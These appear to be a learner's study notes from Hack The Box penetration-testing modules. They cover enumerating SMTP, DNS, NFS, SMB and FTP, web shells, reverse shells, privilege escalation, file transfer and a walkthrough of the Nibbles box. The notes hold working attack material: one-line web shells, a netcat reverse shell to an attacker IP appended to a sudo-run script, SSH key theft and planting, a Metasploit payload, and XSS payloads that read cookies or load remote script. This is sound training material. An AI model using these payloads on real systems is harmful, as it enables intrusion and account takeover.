command | xclip -selection clipboard  - copy output from a command before | to the clipboard

curl https://ifconfig.so		- public IP address :)

export <store_word>=<store>
$store_word
e.g. export target=10.129.244.89
ping $target

torify in terminal to move through tor nodes e.g. torify curl https://ifconfig.so will give you a different public IP addr

SMTP
port 25
sudo nmap 10.129.14.128 -sC -sV -p25
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v

Enumerate the SMTP service and submit the banner, including its version as the answer.
telnet $target 25

Enumerate the SMTP service even further and find the username that exists on the system
initially tried with default wait time(5s) however that was too quick of a timeout for the server to respond. Upped it to -w 20, worked.
smtp-user-enum -w 20 -U footprinting-wordlist.txt -t $target

DNS
dnsenum		-bruteforce hostnames 

Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.
FQDN stands for fully qualified domain name.
export target=10.129.244.89
dig ns inlanefreight.htb @$target

Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...))
dig axfr inlanefreight.htb @$target

What is the IPv4 address of the hostname DC1?
dig axfr inlanefreight.htb @$target

What is the FQDN of the host where the last octet ends with "x.x.x.203"?
Downloaded wordlists to enumerate over dns hostnames
dig axfr inlanefreight.htb @$target
dnsenum –dnsserver $target –enum -p 0 -s 0 -f /dnsenum-wordlists/fierce-hostlist.txt dev.inlanefreight.htb

NFS
Ports 111(RPC) and 2049(NFS). NFS run over RPC. 
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049		-scan NFS service for contents
showmount -e 10.129.14.128		-show available NFS shares
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS		- mount NFS share
ls -l mnt/nfs/		- list contents with unames and group names
ls -n mnt/nfs/		- list contents with UIDs and GUIDs
sudo umount target-NFS		-unmount NFS share

Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.
sudo nmap –script nfs* 10.129.19.209 -sV -p111,2049	to see where the file is located
sudo mount -t nfs 10.129.19.209:/var/nfs ./target-nfs -o nolock		- mounted the share
ls ~/target-nfs
cat flag.txt

Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.
sudo nmap –script nfs* 10.129.19.209 -sV -p111,2049    to see where the file is located
sudo mount -t nfs 10.129.19.209:/mnt/nfsshare ./target-nfs -o nolock   	 - mounted the share
ls ~/target-nfs
cat flag.txt
 
SMB
smbclient -N -L //<IPADDR>		-N null session(anonymous access) -L ls server shares
rpcclient -U “” <IPADDR>		-rpcclient connect to the SMB server ability to send various requests to the SMB server such as srvinfo, enumdomains, querydominfo
nmap <IPADDR> -sC -sV -p139,445		-p139 and 445 are used by SMB
smbmap -H <IPADDR>		-enumerate SMB server

What version of the SMB server is running on the target system? Submit the entire banner as the answer.
sudo nmap 10.129.202.5 -sV -sC -p139,445

What is the name of the accessible share on the target?
smbmap -H 10.129.202.5

Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.
smbclient \\10.129.202.5/sambashare
ls
cd contents
more flag.txt

Find out which domain the server belongs to.
Downloaded a tool from github enum4linux-ng, provides a lot of information about an SMB server
./enum4linux-ng.py 10.129.202.5 -A

Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.
smbmap -H 10.129.202.5
or
./enum4linux-ng.py 10.129.202.5 -A

What is the full system path of that specific share? (format: "/directory/names")
rpcclient -U “” 10.129.202.5
netshareenumall

FTP Enumeration
sudo nmap -sV -p21 -sC -A <IPADDR>	nmap scan on port 21, -sV version scan, -sC default script scan, -A aggressive scan provides more information but way more likely to be detected. 
–script ftp-anon check if the FTP server allow anonymous access, ftp-syst display status of the FTP server, including configs etc. –script-trace is used to display what commands the script send.
ways to connect to FTP:
nc -nv 10.129.14.136 21
telnet 10.129.14.136 21
openssl s_client -connect 10.129.14.136:21 -starttls ftp
Which version of the FTP server is running on the target system? Submit the entire banner as the answer.
nmap --script ftp-anon 10.129.43.135	-checks if the ftp server allow anonymous access, i.e login with user anonymous and w/e password.
The ftp server does allow anon access
ftp anonymous@10.129.43.135
password w/e
success
ls
more flag.txt
HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}



ENUMERATION
cert can display multiple domains
crt.sh - find all domains tied to a company’s cert
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
Shodan
dig - terminal tool to enumerate all DNS records tied to a website
grayhatwarfare.com - discover files in a specific cloud storage


PENTEST PRINCIPLES
1.     There is more than meets the eye. Consider all points of view.
2.     Distinguish between what we see and what we do not see.
3.     There are always ways to gain more information. Understand the target.


WEB REQUESTS

curl [options] [URL/IP:PORT]
curl -X [command] [URL/IP:PORT]
GET     Reads the specified entity from the database table
POST 	 Adds the specified data to the database table
PUT     Updates the data of the specified database table
DELETE     Removes the specified row from the database table
Examples:
curl http://<SERVER_IP>:<PORT>/api.php/city/london << add | jq for JSON format
curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'


curl URL - sends http request to the URL and write out the response
curl -O URL - sends http request to the URL and downloads the response

Hypertext Transport Protocol
curl http://94.237.63.93:38696/downloads.php

Javascript deobfuscation
run javascript - https://jsconsole.com/
minify code - https://javascript-minifier.com/
obfuscate code - http://beautifytools.com/javascript-obfuscator.php
more advanced obfuscation, change string array encoding to base64 - https://obfuscator.io/

beautify code - https://prettier.io/playground/ or https://beautifier.io/
deobfuscate code - https://matthewfl.com/unPacker.html

minification - place the code on the same line
obfuscate - make the code harder to understand

common encoding methods: base64, hex, rot13
Base64 - alpha-numeric characters(a-z, 0-9)
Hex - 0-9, a-f
rot13 - Caesar cypher, shift each character with a specific number, e.g. a → c (shift 2)
tool to identify encoding method - https://www.boxentriq.com/code-breaking/cipher-identifier

HTB Introduction
To connect to hackthebox, download the VPN file and run this command in terminal:
sudo openvpn file

SSH port 22
connect to vpn - sudo openvpn user.ovpn
ssh username@IP - remote connection to server
netcat/ncat/nc IP port - connect to a port

tmux - terminal mulitiplexer, can have multiple terminals on the same window
https://tmuxcheatsheet.com/
vim - text editor
https://vimsheet.com/

Nmap(Network mapper) - scanning tool, e.g. scan what ports are open on a specific IP
nmap IP
nmap -Sc IP - detailed scan
nmap -Sv IP - version scan
nmap -p PORT IP - specify port to scan
nmap -p-  IP - scan all 65535 TCP ports
nmap -sC IP - report the server headers and page title for any page hosted on the server
nmap --script <script name> -p<port> <host> - run specific nmap script
nmap -D RND IP - decoy IP RND=RANDOM IP, IP=TARGET

ftp -p IP - connect to ftp service

nc -nv IP PORT - banner grabber
nmap -sV --script=banner -pPORT IP - banner grabber

SMB(Server Message Block) - communication protocol in microsoft machines 
smbclient IP
smbclient -N -L IP 	-N suppresses the password prompt and - L specifies that we want to retrieve a list of available shares on the remote host 
smbclient -U USER IP 

gobuster is a command-line tool in terminal to DNS, vhost, and directory brute forcing
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

HTTP response codes:
200 - successful
301 - redirect
403 - forbidden 

whatweb command-line tool to extract web server version, supporting frameworks, and applications
whatweb 10.10.10.121
whatweb --no-errors 10.10.10.0/24		- iterate through the whole network

searchsploit	- command-line tool to search for public vulnerabilities/exploits for any application
searchsploit openssh 7.2
searchsploit wordpress simple backup plugin
use exploit *****

public databases of known exploits: 
https://www.exploit-db.com/
https://www.rapid7.com/db/
https://www.vulnerability-lab.com/

metasploit command-line tool for pentesting, msfconsole in terminal
Running reconnaissance scripts to enumerate remote hosts and compromised targets
Verification scripts to test the existence of a vulnerability without actually compromising the target
Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
Many post-exploitation and pivoting tools
msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec
show options
module option RHOSTS(REMOTE HOSTS) is the IP address
check, checks if the server is vulnerable

Types of Shells
Ways to connect to compromised systems are through SSH on linux, winRM on windows or through shells. There 3 types of shells:
Reverse Shell: Connects back to our system and gives us control through reverse connection.
Bind Shell: Waits for us to connect to it and gives us control when we do.
Web Shell: Communicates through a web server, accepts our commands through HTTP parameters, executes them and prints back the output.
Shell commands: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Once we find a vulnerability to execute code on the remote host we can start a netcat listener on our machine that listen on a specific port. We can then execute a reverse shell command to connect the victim’s system’s Shell i.e Bash or Powershell to our netcat listener. 

Netcat command:
nc -lvnp <PORT>
-l: listen mode wait for a connection to us
-v: verbose mode, so we know when we receive a connection
-n: Disable DNS resolution, only connect to/from IP addresses to speed things up
-p: Port

Bind Shell: We connect to the target’s listening port.

Upgrading teletypewriter(TTY) e.g. terminal: Once connected to the target with nc we realize that the terminal lack functions such as backtracking. We need to upgrade by mapping our terminal TTY to the remote host’s TTY. 
python -c 'import pty; pty.spawn("/bin/bash")'
ctrtl+z to background our shell
stty raw -echo
fg to bring back our shell
echo $term
stty size
export TERM=xterm-256color
stty rows 67 columns 318
Once this is done the 	nc should have all a terminal’s features just like SSH.

Web Shell: Web script, e.g. PHP or ASPX that accepts our commands through HTTP request parameters such as GET or POST. E.g.:
PHP: <?php system($_REQUEST["cmd"]); ?>
JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
ASP: <% eval request("cmd") %>
Web roots for most common web servers:
Apache     /var/www/html/
Nginx     /usr/local/nginx/html/
IIS     c:\inetpub\wwwroot\
XAMPP     C:\xampp\htdocs\
E.g.: echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
curl http://SERVER_IP:PORT/shell.php?cmd=id
Web Shell runs on port 80 or 443 which makes it easier to bypass any firewall.

Privilege Escalation
Checklist to look for a way to escalate our privilege to root in Linux or admin/system in Windows. https://book.hacktricks.xyz/ or https://github.com/swisskyrepo/PayloadsAllTheThings
Scripts: Linux: https://github.com/rebootuser/LinEnum.git https://github.com/sleventyeleven/linuxprivchecker
Windows: https://github.com/GhostPack/Seatbelt https://github.com/411Hall/JAWS
Both: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
https://github.com/carlospolop/PEASS-ng
./linpeas.sh

sudo -l		look for commands we can run without providing a password
sudo -u user		run the sudo command as that user not root

Scheduled tasks on an operating system can be exploited by finding how they’re are maintained and add your own script to it. E.g.: common way to maintain scheduled tasks is through Cron Jobs, if we can add our own bash script to /etc/Crontab, /etc/cron.d or /var/spool/cron/crontabs/root.

dpkg -l shows what software is downloaded on the linux system

If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:
Timmyjk@htb[/htb]$ vim id_rsa
Timmyjk@htb[/htb]$ chmod 600 id_rsa
Timmyjk@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file:
Timmyjk@htb[/htb]$ ssh-keygen -f key
This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
Timmyjk@htb[/htb]$ ssh root@10.10.10.10 -i key

Assignments
SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
ssh [given user]@[given ip] -p [given port number of target IP]
sudo -l
sudo -su user2
cd ~
ls
cat flag.txt

Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
cat /root/.ssh/id_rsa
copy results
cd ~
On a new cmd console on your own system
vim id_rsa
paste contents into id_rsa
chmod 600 id_rsa	needed for ssh, it won’t accept the file if it has too high privilege
ssh root@ -p -i id_rsa
ls
cat flag.txt


Transferring files
There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:
Timmyjk@htb[/htb]$ cd /tmp
Timmyjk@htb[/htb]$ python3 -m http.server 8000
Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
or
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

Another method to transfer files would be using scp, granted we have obtained ssh user credentials on the remote host. We can do so as follows:
Timmyjk@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
base64 shell -w 0
Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

file <filename> to ensure file format
To ensure that nothing was interrupted during the process we can check the md5hash:
md5sum <filename>

Nibbles - Enumeration
Commands:
nmap -sV --open -oA nibbles_initial_scan <IP>
nmap -p- --open -oA nibbles_full_tcp_scan <IP>
nc -nv 1 <IP> <PORT>
nmap -sC -p <PORT/PORT, PORT> -oA nibbles_script_scan <IP>
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <IP>

Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)
nmap -sV --open -oA nibbles_initial_scan <IP>

Nibbles - Web Footprinting
Commands:
whatweb <IP>
whatweb <IP>/<DIR>
gobuster dir -u <HTTP://IP> --wordlist /usr/share/dirb/wordlists/common.txt
curl -s http://<IP>/nibbleblog/content/private/users.xml | xmllint  --format -

Nibbles - Initial Foothold
<?php system('id'); ?>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
nc -lvnp <PORT>
python3 -c 'import pty; pty.spawn("/bin/bash")'

Nibbles - Privilege Escalation
Download LinEnum.sh
Start a Python HTTP server:
sudo python3 -m http.server 8080
On the target download the file from your server:
wget http://<your ip>:8080/LinEnum.sh
Found a writable and executable file on the target. Append a reverse shell code to the end and execute it with sudo to get a reverse shell back as the root user:
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f' | tee -a <FILE TO APPEND TO>
e.g. echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8443 >/tmp/f' | tee -a monitor.sh

Nibbles - Alternate User Method - Metasploit
Start metasploit:
msfconsole
search <application name>
use <module number>
set the rhosts i.e the target IP:
rhosts <TARGET IP>
set the lhost i.e your IP:
lhost <YOUR IP>
Type show options to see what options that need to be set for the exploit:
show options
e.g.:
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
targeturi => nibbleblog
msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
Type exploit to start the exploit:
exploit

https://gtfobins.github.io/

 
XSS
<img src=/ onerror=alert(document.cookie)>
<script src=//www.example.com/exploit.js></script>


Can identify what operating system a target has by pinging with ICMP and looking at the TTL of the response. Different operating systems have different TTL.
